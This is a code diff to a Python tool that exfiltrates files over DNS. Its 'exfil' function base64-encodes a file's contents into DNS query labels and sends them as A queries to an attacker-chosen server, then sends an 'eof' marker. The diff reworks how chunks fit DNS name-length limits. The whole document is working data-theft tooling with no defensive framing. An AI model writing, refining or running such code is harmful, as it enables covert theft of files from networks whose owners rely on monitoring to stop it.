@@ -14,12 +14,21 @@ from typing import Optional, List
 from dnslib import DNSRecord, QTYPE
 
 MAX_LABEL = 63
-CHUNK     = 30  # bytes per DNS chunk
+MAX_QNAME = 253  # DNS max query name length
 
 # ────────────────────────── utilities
-def to_labels(data: bytes, max_len: int = MAX_LABEL) -> List[str]:
+def to_labels(data: bytes, domain: str) -> List[str]:
     b64 = base64.urlsafe_b64encode(data).decode().rstrip("=")
-    return [b64[i:i+max_len] for i in range(0, len(b64), max_len)]
+    max_len = MAX_QNAME - len(domain) - 10  # 10 for ".NN." + room for label joins
+    labels = []
+    i = 0
+    while i < len(b64):
+        chunk = b64[i:i+MAX_LABEL]
+        labels.append(chunk)
+        i += MAX_LABEL
+        if sum(len(l) + 1 for l in labels) + len(domain) + 4 >= MAX_QNAME:
+            break
+    return labels
 
 def validate(qname: str) -> None:
     for label in qname.split("."):
@@ -44,14 +53,12 @@ def resolve_ip(domain: str) -> Optional[str]:
     if ip:
         print(f"[DEBUG] Resolved A {domain} → {ip}")
         return ip
-
     ns = _resolve_first(domain, "NS")
     if ns:
         ip = _resolve_first(ns.rstrip("."), "A")
         if ip:
             print(f"[DEBUG] via NS {ns} → {ip}")
             return ip
-
     print("[!] No usable A/NS glue")
     return None
 
@@ -62,30 +69,24 @@ def send(qname: str, server_ip: str) -> None:
         pkt = DNSRecord.question(qname, qtype="A").pack()
         addr = (server_ip, 53)
         print(f"[DEBUG] Sending to {server_ip} → {qname}")
-
         with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
             s.settimeout(2)
             s.sendto(pkt, addr)
-
     except Exception as e:
         print(f"[!] Send failed to {server_ip} for {qname}: {e}")
         traceback.print_exc()
 
 # ────────────────────────── main logic
-def exfil(file_path: str,
-          srv_or_dom: str,
-          dom: Optional[str],
-          delay: float) -> None:
-
+def exfil(file_path: str, srv_or_dom: str, dom: Optional[str], delay: float) -> None:
     if dom is None:
-        domain     = srv_or_dom
-        server_ip  = resolve_ip(domain)
+        domain = srv_or_dom
+        server_ip = resolve_ip(domain)
         if not server_ip:
             print("[!] Abort: cannot resolve domain")
             return
     else:
-        server_ip  = srv_or_dom
-        domain     = dom
+        server_ip = srv_or_dom
+        domain = dom
 
     print(f"[✓] Resolved target → {server_ip}")
     if not os.path.isfile(file_path):
@@ -100,16 +101,22 @@ def exfil(file_path: str,
     time.sleep(delay)
 
     # 2️⃣ chunked transfer
-    chunks = [data[i:i+CHUNK] for i in range(0, len(data), CHUNK)]
-    for idx, chunk in enumerate(chunks):
-        qname = ".".join(to_labels(chunk) + [str(idx), domain])
-        print(f"[+] chunk {idx}/{len(chunks)-1}")
+    index = 0
+    offset = 0
+    while offset < len(data):
+        chunk_size = 48  # raw data chunk (approx, actual split by labels)
+        chunk = data[offset:offset+chunk_size]
+        labels = to_labels(chunk, domain)
+        qname = ".".join(labels + [str(index), domain])
+        print(f"[+] chunk {index}")
         send(qname, server_ip)
+        offset += chunk_size
+        index += 1
         time.sleep(delay)
 
     # 3️⃣ eof
     send(f"eof.{domain}", server_ip)
-    print(f"[✓] Sent {len(chunks)} chunks → {server_ip}")
+    print(f"[✓] Sent {index} chunks → {server_ip}")
 
 # ────────────────────────── CLI entry
 if __name__ == "__main__":
